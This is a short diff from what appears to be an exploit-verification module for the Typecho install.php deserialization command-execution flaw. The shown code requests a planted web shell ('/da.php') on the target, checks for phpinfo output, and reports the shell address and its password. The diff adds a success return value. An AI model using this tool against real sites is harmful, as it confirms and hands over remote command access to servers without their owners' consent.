@@ -34,6 +34,7 @@ class typecho_install_code_exec_BaseVerify:
             req1 = requests.post(self.url + "/da.php", data=post_data, headers=headers, timeout=10, verify=False)
             if r"Configuration File (php.ini) Path" in req1.text:
                 cprint("[+]存在typecho install.php反序列化命令执行漏洞...(高危)\tpayload: "+vulnurl+"\tshell地址: "+shellpath+"\t密码: pp", "red")
+                return True, vulnurl, "typecho install.php反序列化命令执行", vulnurl, req.text
             else:
                 cprint("[-]不存在typecho_install_code_exec漏洞", "white", "on_grey")
                 return False, None, None, None, None
